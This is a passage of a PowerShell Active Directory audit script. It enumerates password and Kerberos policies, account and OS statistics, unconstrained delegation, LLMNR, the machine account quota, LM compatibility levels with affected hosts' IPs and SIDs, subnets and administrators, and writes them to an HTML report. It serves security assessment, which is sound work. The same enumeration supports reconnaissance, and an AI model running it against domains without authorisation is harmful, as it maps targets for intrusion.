					$LockoutBadCount = if ($content -match "LockoutBadCount\s*=\s*(\d+)") {$matches[1]}
					$ClearTextPassword = if ($content -match "ClearTextPassword\s*=\s*(\d+)") {if ($matches[1] -eq "1") {"Enabled"} else {"Disabled"}}
					
					[PSCustomObject]@{
						"Domain"                = $AllDomain
						"Policy Name"           = $TargetGPO.displayname
						"Pwd Complexity"        = $PwdComplexity
						"Min Pwd Length"        = $MinPwdLength
						"Min Pwd Age"           = "$MinPwdAge day(s)"
						"Max Pwd Age"           = $MaxPwdAge
						"Password History"      = $PwdHistorySize
						"Lockout Threshold"     = $LockoutBadCount
						"Reversible Encryption" = $ClearTextPassword
						OUs						= $OUs
					}
				}
			}
		}
	}

 	if ($TempOtherPolicies) {
		if(!$NoOutput){$TempOtherPolicies | Sort-Object Domain,"Policy Name" | Format-Table -AutoSize -Wrap}
		$HTMLOtherPolicies = $TempOtherPolicies | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='OtherPolicies'>Other Password Policies</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='OtherPolicies'>" }
	}
	
	#########################################
    ######### Kerberos Policy ###############
	#########################################
	
	Write-Host ""
	Write-Host "Kerberos Password Policy" -ForegroundColor Cyan
	$TempKerberosPolicy = foreach ($AllDomain in $AllDomains) {
		$RelevantGpoPolicies = $AllCollectedGPOs | Where-Object {
			$_.domain -eq $AllDomain -AND
			$_.cn -eq "{31B2F340-016D-11D2-945F-00C04FB984F9}"
		}

		foreach ($RelevantGpoPolicy in $RelevantGpoPolicies) {
			$GptTmplPath = $RelevantGpoPolicy.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
			if (Test-Path $GptTmplPath) {
				$GptTmplContent = Get-Content $GptTmplPath -Raw
				$KerberosPolicies = @{}
				$regexPattern = "^(MaxTicketAge|MaxRenewAge|MaxServiceAge|MaxClockSkew|TicketValidateClient)\s*=\s*(\d+)"
				$GptTmplContent -split "\r?\n" | ForEach-Object {
					if ($_ -match $regexPattern) {
						$KerberosPolicies[$matches[1]] = $matches[2]
					}
				}

				[PSCustomObject]@{
					"Domain" = $AllDomain
					"Max Ticket Age" = $KerberosPolicies["MaxTicketAge"]
					"Max Renew Age" = $KerberosPolicies["MaxRenewAge"]
					"Max Service Age" = $KerberosPolicies["MaxServiceAge"]
					"Max Clock Skew" = $KerberosPolicies["MaxClockSkew"]
					"Ticket Validate Client" = $KerberosPolicies["TicketValidateClient"]
				}
			}
		}
	}

 	if ($TempKerberosPolicy) {
		if(!$NoOutput){$TempKerberosPolicy | Sort-Object Domain | Format-Table -AutoSize -Wrap}
		$HTMLKerberosPolicy = $TempKerberosPolicy | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='KerberosPolicy'>Kerberos Password Policy</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='KerberosPolicy'>" }
	}

	
	##################################################
    ########### User Accounts Analysis ###############
	##################################################
	
	Write-Host ""
	Write-Host "User Accounts Analysis" -ForegroundColor Cyan

	$TempUserAccountAnalysis = foreach ($AllDomain in $AllDomains) {
		$UserAccountAnalysis = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain})
		
		[PSCustomObject]@{
			Domain = $AllDomain
			'Nb User Accounts' = @($UserAccountAnalysis + ($TotalDisabledUsers | Where-Object {$_.domain -eq $AllDomain})).count
			'Nb Enabled' = @(($UserAccountAnalysis | Where-Object { ([int]$_.userAccountControl -band 2) -eq 0 })).Count
			'Nb Disabled' = @($TotalDisabledUsers | Where-Object {$_.domain -eq $AllDomain}).Count
			'Nb Active' = @(($UserAccountAnalysis | Where-Object { (Convert-LdapTimestamp -timestamp $_.lastlogontimestamp) -ge $inactiveThreshold})).count
			'Nb Inactive' = @(($UserAccountAnalysis | Where-Object { (Convert-LdapTimestamp -timestamp $_.lastlogontimestamp) -lt $inactiveThreshold})).count
			'Nb Locked' = @(($UserAccountAnalysis | Where-Object { $_.lockouttime -ne $null })).Count
			'Nb Pwd Never Expire' = @(($UserAccountAnalysis | Where-Object { ([int]$_.userAccountControl -band 65536) -ne 0 })).Count
			'Nb Password not Req.' = @(($UserAccountAnalysis | Where-Object { ([int]$_.userAccountControl -band 32) -ne 0 })).Count
			'Nb Reversible Password' = @(($UserAccountAnalysis | Where-Object {if ($null -ne $_.userAccountControl) {$uacValue = [int]$_.userAccountControl;$binaryUAC = [convert]::ToString($uacValue, 2).PadLeft(32, '0');$binaryUAC[-8] -eq '1'}})).Count
		}
	}

 	if ($TempUserAccountAnalysis) {
		if(!$NoOutput){$TempUserAccountAnalysis | Sort-Object Domain | Format-Table -AutoSize}
		$HTMLUserAccountAnalysis = $TempUserAccountAnalysis | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='UserAccountAnalysis'>User Accounts Analysis</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='UserAccountAnalysis'>" }

  		$UserAccountAnalysisTable = [PSCustomObject]@{
			"Recommendations" = "Review Inactive and Disabled User Accounts and consider deleting them from AD"
		}
		
		$HTMLUserAccountAnalysisTable = $UserAccountAnalysisTable | ConvertTo-Html -As List -Fragment
  		$HTMLUserAccountAnalysisTable = $HTMLUserAccountAnalysisTable.Replace("*", "Recommendations")
		
		$HTMLUserAccountAnalysisTable = "<div class='report-section' style='display:none;'>$HTMLUserAccountAnalysisTable</div>"
	}

	
	######################################################
    ########### Computer Accounts Analysis ###############
	######################################################
	
	Write-Host ""
	Write-Host "Computer Account Analysis" -ForegroundColor Cyan

	$TempComputerAccountAnalysis = foreach ($AllDomain in $AllDomains) {
		$ComputerAccountAnalysis = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain})
		$Unconstrained = @($ComputerAccountAnalysis | Where-Object {$_.domain -eq $AllDomain -AND $TotalDomainControllers.dnshostname -notcontains $_.dnshostname -AND ([int]$_.userAccountControl -band 524288) -eq 524288})
		
		[PSCustomObject]@{
			Domain = $AllDomain
			'Nb Computer Accounts' = @($ComputerAccountAnalysis + ($TotalDisabledMachines | Where-Object {$_.domain -eq $AllDomain})).count
			'Nb Enabled' = @(($ComputerAccountAnalysis | Where-Object { ([int]$_.userAccountControl -band 2) -eq 0 })).Count
			'Nb Disabled' = @($TotalDisabledMachines | Where-Object {$_.domain -eq $AllDomain}).Count
			'Nb Active' = @(($ComputerAccountAnalysis | Where-Object { (Convert-LdapTimestamp -timestamp $_.lastlogontimestamp) -ge $inactiveThreshold})).count
			'Nb Inactive' = @(($ComputerAccountAnalysis | Where-Object { (Convert-LdapTimestamp -timestamp $_.lastlogontimestamp) -lt $inactiveThreshold})).count
			'Unconstrained Delegations' = @($Unconstrained).count
		}
	}

 	if ($TempComputerAccountAnalysis) {
		if(!$NoOutput){$TempComputerAccountAnalysis | Sort-Object Domain | Format-Table -AutoSize}
		$HTMLComputerAccountAnalysis = $TempComputerAccountAnalysis | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ComputerAccountAnalysis'>Computer Account Analysis</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ComputerAccountAnalysis'>" }

  		$ComputerAccountAnalysisTable = [PSCustomObject]@{
			"Recommendations" = "Review Inactive and Disabled Computer Accounts and consider deleting them from AD"
		}
		
		$HTMLComputerAccountAnalysisTable = $ComputerAccountAnalysisTable | ConvertTo-Html -As List -Fragment
  		$HTMLComputerAccountAnalysisTable = $HTMLComputerAccountAnalysisTable.Replace("*", "Recommendations")
		
		$HTMLComputerAccountAnalysisTable = "<div class='report-section' style='display:none;'>$HTMLComputerAccountAnalysisTable</div>"
	}

	
	######################################################
    ########### Operating Systems Insights ###############
	######################################################
	
	Write-Host ""
	Write-Host "Operating Systems Insights" -ForegroundColor Cyan

	$TempOperatingSystemsAnalysis = foreach ($AllDomain in $AllDomains) {
		$AllSystems = @($TotalEnabledDisabledMachines | Where-Object {$_.domain -eq $AllDomain})
		$OperatingSystemsAnalysis = @($AllSystems | Where-Object {$_.operatingsystem} | Select-Object -ExpandProperty operatingsystem | Sort-Object -Unique)
		
		foreach($OperatingSystem in $OperatingSystemsAnalysis){
			[PSCustomObject]@{
				Domain = $AllDomain
				'Operating System' = $OperatingSystem
				'Nb OS' = @($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem}).count
				'Nb Enabled' = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain -AND $_.operatingsystem -eq $OperatingSystem} ).Count
				'Nb Disabled' = @($TotalDisabledMachines | Where-Object {$_.domain -eq $AllDomain -AND $_.operatingsystem -eq $OperatingSystem} ).Count
				'Nb Active' = @($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { (Convert-LdapTimestamp -timestamp $_.lastlogontimestamp) -ge $inactiveThreshold}).count
				'Nb Inactive' = @($AllSystems | Where-Object {$_.operatingsystem -eq $OperatingSystem} | Where-Object { (Convert-LdapTimestamp -timestamp $_.lastlogontimestamp) -lt $inactiveThreshold}).count
			}
		}
		
	}

 	if ($TempOperatingSystemsAnalysis) {
		if(!$NoOutput){$TempOperatingSystemsAnalysis | Sort-Object Domain,'Operating System' | Format-Table -AutoSize}
		$HTMLOperatingSystemsAnalysis = $TempOperatingSystemsAnalysis | Sort-Object Domain,'Operating System' | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='OperatingSystemsAnalysis'>Operating Systems Insights</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='OperatingSystemsAnalysis'>" }
	}
	
	####################################################
    ######### LLMNR Status ###############
	####################################################
	
	Write-Host ""
	Write-Host "LLMNR Status" -ForegroundColor Cyan
	
	$TempLLMNR = @()
	$TempLLMNR += foreach ($AllDomain in $AllDomains) {
		
		$sysvolPath = "\\$AllDomain\SYSVOL\$AllDomain\Policies"

		$registryPolFiles = Get-ChildItem -Path $sysvolPath -Filter Registry.pol -Recurse
		foreach ($file in $registryPolFiles) {
			# Read the content of the Registry.pol file as a single string
			$content = Get-Content -Path $file.FullName -Encoding Unicode -Raw

			$pattern = "\[.*?EnableMulticast.*?\]"

			# Perform the regex match to find the pattern
			if ($content -match $pattern) {
				
				$extractedString = $matches[0]
				$byteArray = [System.Text.Encoding]::Unicode.GetBytes($extractedString)
				
				$TempGPOPath = if ($file.DirectoryName -match '(.*\})') {$matches[1]}
				$TargetGPO = @($AllCollectedGPOs | Where-Object {$_.domain -eq $AllDomain -AND $_.gpcfilesyspath -eq $TempGPOPath})
				
				if($byteArray[148] -eq 0){
					[PSCustomObject]@{
						Domain = $AllDomain
						"GPO Name" = $TargetGPO.displayname
						"Location" = $TargetGPO.gpcfilesyspath
						"LLMNR" = "Disabled"
					}
				}
				elseif($byteArray[148] -eq 1){
					[PSCustomObject]@{
						Domain = $AllDomain
						"GPO Name" = $TargetGPO.displayname
						"Location" = $TargetGPO.gpcfilesyspath
						"LLMNR" = "Explicitly Enabled"
					}
				}
			}
		}
	}

 	foreach ($AllDomain in $AllDomains) {
		$Tmpllmnrstatus = $null
		$Tmpllmnrstatus = $TempLLMNR | Where-Object {$_.Domain -eq $AllDomain}
		if(!$Tmpllmnrstatus){
			$TempLLMNR += [PSCustomObject]@{
				Domain = $AllDomain
				"GPO Name" = "Not Found"
				"Location" = "Not Found"
				"LLMNR" = "No GPO has been found which explicitly disables LLMNR. Defaults to Enabled"
			}
		}
	}
	
	$llmnrpath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
	$llmnrpropertyName = "EnableMulticast"
	
	$TempLLMNR = @($TempLLMNR | Sort-Object Domain,'GPO Name')
	
	if (Test-Path $llmnrpath) {
		# Try to get the property value
		$propertyValue = Get-ItemProperty -Path $llmnrpath -Name $llmnrpropertyName -ErrorAction SilentlyContinue

		if ($null -ne $propertyValue) {
			# Check the value of EnableMulticast
			if ($propertyValue.EnableMulticast -eq 0) {
				$FinalResult = "Disabled"
			} else {
				$FinalResult = "Enabled"
			}
		} else {
			$FinalResult = "EnableMulticast is not configured. Defaults to Enabled"
		}
	} else {
		$llmnrpath = "Path doesn't exist"
		$FinalResult = "Defaults to Enabled"
	}
	
	$TempLLMNR += [PSCustomObject]@{
					Domain = "Local Check"
					"GPO Name" = "Registry"
					"Location" = $llmnrpath
					"LLMNR" = $FinalResult
				}
	
	if($TempLLMNR){
		if(!$NoOutput){$TempLLMNR | Format-Table -AutoSize}
		$HTMLLLMNR = $TempLLMNR | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='LLMNRStatus'>LLMNR Status</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='LLMNRStatus'>" }
	}
	
	####################################################################
    ########### Add workstations to domain ###############
	####################################################################
	
	<# Write-Host ""
	Write-Host "Add workstations to domain" -ForegroundColor Cyan #>
	
	# Loop through each relevant GPO
	$TempAddworkstationstodomain = foreach($AllDomain in $AllDomains){
		$gpo = $AllCollectedGPOs | Where-Object {$_.domain -eq $AllDomain -and $_.displayname -eq "Default Domain Controllers Policy"}
		$gpoPath = $gpo.gpcfilesyspath
		$gpoDisplayName = $gpo.displayname
		
		# Check for Restricted Groups settings
		$restrictedGroupsPath = Join-Path -Path $gpoPath -ChildPath "MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
		try{
			$restrictedGroupsContent = Get-Content -Path $restrictedGroupsPath -Raw
			
			$lines = $restrictedGroupsContent -split "`r`n" | Where-Object { $_ -match "SeMachineAccountPrivilege" }

			foreach ($line in $lines) {
				if ($line -match "SeMachineAccountPrivilege =\s*(?<values>.*)") {
					$values = $Matches['values'].Trim()

					# Split the values by "," to support multiple entries
					if($values -eq ""){}
					else{
						$memberValues = $values -split "," | ForEach-Object { $_.TrimStart("*") }

						# Translate member SIDs to names
						$memberNames = $memberValues | ForEach-Object {
							$tempholder = $_
							if(Test-SidFormat $tempholder){
								foreach($SumGroupsUser in $SumGroupsUsers){
									if($tempholder -eq (GetSID-FromBytes -sidBytes $SumGroupsUser.objectsid)){
										$TryToExtractMember = $SumGroupsUser
										break
									}
								}
								if($TryToExtractMember){"$($TryToExtractMember.domain)\$($TryToExtractMember.samaccountname)"}
								else{$tempholder}
							}
							else{
								try {
									$tempholder = $_
									$memberSID = New-Object System.Security.Principal.SecurityIdentifier($tempholder)
									$memberUser = $memberSID.Translate([System.Security.Principal.NTAccount])
									$memberUser.Value
								} catch {
									$tempholder
								}
							}
						}
					}
				}
			}
		
			# Collect the result
			[PSCustomObject]@{
				"GPO Display Name" = $gpoDisplayName
				#"GPO Path" = $gpoPath
				"Who can add Workstations to the Domain" = $memberNames -join ', '
				Domain = $AllDomain
			}
			
		} catch {}
	}
	
	<# if ($TempAddworkstationstodomain) {
		$TempAddworkstationstodomain | Sort-Object -Unique "Domain", "GPO Display Name" | Format-Table -AutoSize -Wrap
		$HTMLAddworkstationstodomain = $TempAddworkstationstodomain | Sort-Object -Unique "Domain", "GPO Display Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='Addworkstationstodomain'>Add workstations to domain</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='Addworkstationstodomain'>" }
	} #>
	
	#################################################
    ########### Machine Account Quota ###############
	#################################################
	
	Write-Host ""
	Write-Host "Machine Account Quota" -ForegroundColor Cyan

	$TempMachineQuota = foreach ($AllDomain in $AllDomains) {
		$InfoQuota = @()
		$InfoQuota = @($DomainPolicy | Where-Object {$_.domain -eq $AllDomain}) | Select -ExpandProperty "ms-ds-machineaccountquota"
		$Whocan = $TempAddworkstationstodomain | Where-Object {$_.domain -eq $AllDomain} | Select-Object -ExpandProperty "Who can add Workstations to the Domain"
		$WhocanFull = $Whocan
		$Whocan = $Whocan -split ", "
		$Whocan = foreach($Who in $Whocan){
			($Who -split "\\")[1]
		}
		if($Whocan.count -gt 1){$Whocan = $Whocan -join " and "}
		[PSCustomObject]@{
			'Domain' = $AllDomain
			'Quota' = $InfoQuota
			"Who can add Workstations to the Domain" = $WhocanFull
			Info = "$Whocan can create $InfoQuota computer accounts in this domain."
		}
	}

 	if ($TempMachineQuota) {
	    if(!$NoOutput){$TempMachineQuota | Sort-Object Domain | Format-Table -AutoSize}
	    $HTMLMachineQuota = $TempMachineQuota | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='MachineQuota'>Machine Account Quota</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='MachineQuota'>" }
	    $TempMachineQuota | Sort-Object Quota | Select-Object Quota | ForEach-Object {
	        if (${_}.Quota -eq 0) {
	            $HTMLMachineQuota = $HTMLMachineQuota -replace "<td>0</td>", "<td class=`"NoStatus`">0</td>"
	        } else {
	            $TempQuota = $_.Quota
	            $HTMLMachineQuota = $HTMLMachineQuota -replace "<td>$TempQuota</td>", "<td class=`"YesStatus`">$TempQuota</td>"
	        }
	    }

     		$MachineAccountQuotaTable = [PSCustomObject]@{
			"Description" = "The creators of machine accounts gain write access to their sensitive attributes, enabling privilege escalation and abuse of Resource-Based Constrained Delegation."
			"Recommendation" = "Make sure the machine account creation quota is set to 0 to mitigate these risks."
		}
		
		$HTMLMachineAccountQuotaTable = $MachineAccountQuotaTable | ConvertTo-Html -As List -Fragment
  		$HTMLMachineAccountQuotaTable = $HTMLMachineAccountQuotaTable.Replace("*", "Description")
		
		$HTMLMachineAccountQuotaTable = "<div class='report-section' style='display:none;'>$HTMLMachineAccountQuotaTable</div>"
	}
	
	##################################################
    ########### LM Compatibility Level ###############
	##################################################
	
	Write-Host ""
	Write-Host "LM Compatibility Level" -ForegroundColor Cyan

	$policySettings = @{
		"0" = "Send LM & NTLM responses"
		"1" = "Send LM & NTLM - use NTLMv2 session security if negotiated"
		"2" = "Send NTLM response only"
		"3" = "Send NTLMv2 response only"
		"4" = "Send NTLMv2 response only. Refuse LM"
		"5" = "Send NTLMv2 response only. Refuse LM and NTLM"
	}

	$TempLMCompatibilityLevel = foreach ($AllDomain in $AllDomains) {
		$Results = @()
		$RelevantGpoPolicies = @($AllCollectedGPOs | Where-Object {$_.domain -eq $AllDomain -AND $_.gpcfilesyspath})
		$RelevantGpoPolicies |
		ForEach-Object {
			$settingValue = $null
			$policySetting = $null
			$gpoPath = $_.gpcfilesyspath.TrimStart("[").TrimEnd("]")
			$gpoDisplayName = $_.displayname
			if(Test-Path "$gpoPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"){
				$gpoSetting = (Get-Content -Path "$gpoPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" -Raw | Select-String -Pattern "LmCompatibilityLevel" | Select-Object -Last 1).Line
				$gpoSetting = ($gpoSetting | Out-String) -split "`n"
				$gpoSetting = $gpoSetting | Select-String -Pattern "LmCompatibilityLevel"
				$gpoSetting = ($gpoSetting | Out-String) -split "`n"
				$gpoSetting = $gpoSetting.Trim()
				$gpoSetting = $gpoSetting | Where-Object { $_ -ne "" }
			}

			if ($gpoSetting) {
				$settingValue = ($gpoSetting -split "=")[-1].Trim().Split(",")[-1].Trim()
				$policySetting = $policySettings[$settingValue]

				$Results += [PSCustomObject]@{
					Domain = $AllDomain
					"GPO Name" = $gpoDisplayName
					Setting = $settingValue
					"LM Compatibility Level" = $policySetting
				}
			}

		}

		if ($Results.Count -eq 0) {
				[PSCustomObject]@{
					Domain = $AllDomain
					"GPO Name" = "No GPO Set"
					Setting = "Default"
					"LM Compatibility Level" = "Dependent on the OS"
				}
		}
		else {
				$Results
		}

	}

 	if ($TempLMCompatibilityLevel) {
		if(!$NoOutput){$TempLMCompatibilityLevel | Sort-Object Domain,"GPO Name" | Format-Table -AutoSize -Wrap}
		$HTMLLMCompatibilityLevel = $TempLMCompatibilityLevel | Sort-Object Domain,"GPO Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='LMCompatibilityLevel'>LM Compatibility Level</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='LMCompatibilityLevel'>" }
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Send NTLM response only</td>','<td class="YesStatus">Send NTLM response only</td>'
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>2</td>','<td class="YesStatus">2</td>'
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Send LM & NTLM - use NTLMv2 session security if negotiated</td>','<td class="YesStatus">Send LM and NTLM - use NTLMv2 session security if negotiated</td>'
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>1</td>','<td class="YesStatus">1</td>'
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Send LM and NTLM responses</td>','<td class="YesStatus">Send LM and NTLM responses</td>'
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>0</td>','<td class="YesStatus">0</td>'
  		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>3</td>','<td class="NoStatus">3</td>'
      	$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>4</td>','<td class="NoStatus">4</td>'
	  	$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>5</td>','<td class="NoStatus">5</td>'
    	$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Send NTLMv2 response only</td>','<td class="NoStatus">Send NTLMv2 response only</td>'
		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Send NTLMv2 response only. Refuse LM</td>','<td class="NoStatus">Send NTLMv2 response only. Refuse LM</td>'
     	$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Send NTLMv2 response only. Refuse LM and NTLM</td>','<td class="NoStatus">Send NTLMv2 response only. Refuse LM and NTLM</td>'
	 	$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>Default</td>','<td class="YesStatus">Default</td>'
   		$HTMLLMCompatibilityLevel = $HTMLLMCompatibilityLevel -replace '<td>No GPO Set</td>','<td class="YesStatus">No GPO Set</td>'

  		$LMCompatibilityLevelTable = [PSCustomObject]@{
			"Description" = "Determines which challenge response authentication protocol is used for network logons. If set lower than 3, NTLMv1 auth will be supported, which could be abused to compromise the domain."
   			"More Info" = "NTLMv1 is enabled on domain controllers to accept the connection of older operating systems. If no GPO defines the LAN Manager Authentication Level, the DCs fall back to the non secure default."
			#"Recommendation" = "Evaluate the necessity of enabling support for NTLMv1 authentication in your network, and consider raising the Compatibility Level to a minimum value of 3."
		}
		
		$HTMLLMCompatibilityLevelTable = $LMCompatibilityLevelTable | ConvertTo-Html -As List -Fragment
  		#$HTMLLMCompatibilityLevelTable = $HTMLLMCompatibilityLevelTable.Replace("*", "Description")
    	$HTMLLMCompatibilityLevelTable = $HTMLLMCompatibilityLevelTable.Replace("Description", '<a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level" target="_blank">Description</a>')
      	$HTMLLMCompatibilityLevelTable = $HTMLLMCompatibilityLevelTable.Replace("More Info", '<a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain" target="_blank">More Info</a>')
		
		$HTMLLMCompatibilityLevelTable = "<div class='report-section' style='display:none;'>$HTMLLMCompatibilityLevelTable</div>"
	}
	
	#################################################
    ########### Vulnerable LM Comp Level GPOs ###############
	#################################################
	
	#Write-Host ""
	#Write-Host "Vulnerable LM Comp Level GPOs" -ForegroundColor Cyan
	
	$VulnerableLMCompLevelPolocies = @()
	$VulnerableLMCompLevelPolocies = $TempLMCompatibilityLevel | Where-Object {$_.Setting -le 2}
	$AllOUsToCollect = @()
	
	$VulnerableLMCompLevelGPOs = foreach($VulnerableLMCompLevelPolocy in $VulnerableLMCompLevelPolocies){
		$ExtractedGPOName = $VulnerableLMCompLevelPolocy."GPO Name"
		$ExtractedGPODomain = $VulnerableLMCompLevelPolocy."Domain"
		$ExtractedGPO = $AllCollectedGPOs | Where-Object { $_.domain -eq $ExtractedGPODomain -AND  $_.DisplayName -eq $ExtractedGPOName}
		$GPOGuid = ($ExtractedGPO.gpcfilesyspath -split "}")[-2].split("{")[-1]  # Extracting the GPO's GUID
		$TargetOUs = @($AllCollectedOUs | Where-Object { $_.domain -eq $ExtractedGPODomain -AND $_.gplink -like "*$GPOGuid*"} )
		
		# Add the property to each object in $TargetOUs
		foreach ($OU in $TargetOUs) {
			$OU | Add-Member -MemberType NoteProperty -Name "VulnGPO" -Value $ExtractedGPOName
		}
		
		$AllOUsToCollect += $TargetOUs
		$OUs = $TargetOUs.name -Join " - "
		[PSCustomObject]@{
			Domain = $ExtractedGPODomain
			"GPO Name" = $ExtractedGPO.DisplayName
			"Path" = ($ExtractedGPO.gpcfilesyspath -split "\\")[-1]
			"OUs the policy applies to" = $OUs
		}
	}
	<# if($VulnerableLMCompLevelGPOs){
		$VulnerableLMCompLevelGPOs | Sort-Object -Unique Domain,"GPO Name" | ft -Autosize -Wrap
		$HTMLVulnLMCompLevelGPOs = $VulnerableLMCompLevelGPOs | Sort-Object -Unique Domain,"GPO Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='VulnLMCompLevelGPOs'>Vulnerable LM Comp Level GPOs</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='VulnLMCompLevelGPOs'>" }
	} #>
	
	#################################################
    ########### Vulnerable LM Comp Level OUs ###############
	#################################################
	
	Write-Host ""
	Write-Host "LM Comp Level Affected Machines" -ForegroundColor Cyan
	if($AllOUsToCollect){
		$VulnerableLMCompLevelComp = @()
		foreach($OUCollected in $AllOUsToCollect){
			$ouDN = $OUCollected.distinguishedName
			$OUVulnGPO = $OUCollected.VulnGPO
			
			# Filter users within this OU
			#$users = @($TotalEnabledUsers | Where-Object { $_.distinguishedName -like "*,${ouDN}" } | ForEach-Object { $_.samaccountname })

			# Filter computers within this OU
			$computers = @($TotalEnabledMachines | Where-Object { $_.distinguishedName -like "*,${ouDN}" } | ForEach-Object {$_})
			
			foreach($comp in $computers){
				# Create a custom object for each OU with its members
				if($comp.DnsHostName){$IPAddress = (Resolve-DnsName -Name $comp.DnsHostName -Type A).IPAddress}
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				$Targetsid = GetSID-FromBytes -sidBytes $comp.objectsid
				
				$VulnerableLMCompLevelComp += [PSCustomObject]@{
					Domain  = $OUCollected.domain
					"Vulnerble GPO" = $OUVulnGPO
					"OU Name" = $OUCollected.name
					Members = $comp.samaccountname
					"IP Address" = $IPAddress
					"Operating System" = $comp.operatingsystem
					"SID" = $Targetsid
					"Member Domain" = $comp.domain
				}
			}
		}
		
		if($VulnerableLMCompLevelComp){
			if(!$NoOutput){$VulnerableLMCompLevelComp | Sort-Object -Unique Domain,"Vulnerble GPO","OU Name",Members | ft -Autosize -Wrap}
			$HTMLVulnLMCompLevelComp = $VulnerableLMCompLevelComp | Sort-Object -Unique Domain,"Vulnerble GPO","OU Name",Members | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='VulnLMCompLevelComp'>LM Comp Level Affected Machines</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='VulnLMCompLevelComp'>" }
		}
	}
	
	#################################################
    ########### Subnets ###############
	#################################################
	
	Write-Host ""
	Write-Host "Subnets" -ForegroundColor Cyan
	
	if($AllSubnets | Where-Object {$_}){
		if(!$NoOutput){$AllSubnets | Sort-Object -Unique Domain,Site,Subnet | ft -Autosize -Wrap}
		$HTMLSubnets = $AllSubnets | Sort-Object -Unique Domain,Site,Subnet | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='Subnets'>Subnets</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='Subnets'>" }
	}
	
	####################################################
    ########### Administrators ################
	####################################################


 	$AdministratorsBanner = "<h3>Administrators</h3>"
		Write-Host ""
		Write-Host "Administrators" -ForegroundColor Red
		Write-Host ""

	
	####################################################
    ########### Built-In Administrators ################
	####################################################
	
	Write-Host ""
    Write-Host "Built-In Administrators" -ForegroundColor Cyan
	$TempBuiltInAdministrators = foreach ($AllDomain in $AllDomains) {
		$BuiltInAdministrators = @()
		$BuiltInAdministrators = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Administrators"
		foreach($BuiltInAdministrator in $BuiltInAdministrators){
			
			$isEnabled = if ($BuiltInAdministrator.useraccountcontrol -band 2) { "False" } else { "True" }
			if($BuiltInAdministrator.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $BuiltInAdministrator.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $BuiltInAdministrator.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $BuiltInAdministrator.objectsid)}
				$tempmembername = if($ExtractedMember.samaccountname){$ExtractedMember.samaccountname}else{""}
				$memberdomain = $ExtractedMember.domain
				$membername = if($tempmembername){($memberdomain -split "\.")[0] + "\" + $tempmembername}else{""}
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}
